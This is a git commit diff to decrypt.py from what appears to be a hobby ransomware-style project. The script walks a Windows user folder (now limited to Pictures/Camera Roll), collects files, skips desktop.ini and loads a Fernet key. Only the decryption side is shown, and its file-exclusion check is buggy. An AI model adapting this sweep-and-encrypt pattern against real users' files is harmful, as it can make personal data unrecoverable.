344c17ad1be17396fb89db5e5b16854c2f36d7f5
JLDreal <106476341+JLDreal@users.noreply.github.com>
2022-05-30 20:13:29 +0200

    win11 file weird

--- decrypt.py
+++ decrypt.py
@@ -1,19 +1,23 @@
 import os
 import scandir
 from cryptography.fernet import Fernet
-folder = os.path.expandvars("%userprofile%")
+folder = os.path.expandvars("%userprofile%")+"/Pictures/Camera Roll" #last part changeable
 
 file_list = []
 
 for paths, dirs, files in scandir.walk(folder):
-#for (paths, dirs, files) in os.walk(folder):
     for file in files:
         if file.endswith("encrypt.py" or "decrypt.py" or "thekey.key"):
             continue
         else:
             file_list.append(os.path.join(paths, file))
 
-
+#weird win11 File thing idk
+if (folder+"\\desktop.ini") in file_list:
+    file_list.remove(folder+"\\desktop.ini")
+else:
+    print(file_list)
+#end of that
 
 with open("thekey.key", "rb") as thekey:
     secretkey = thekey.read()
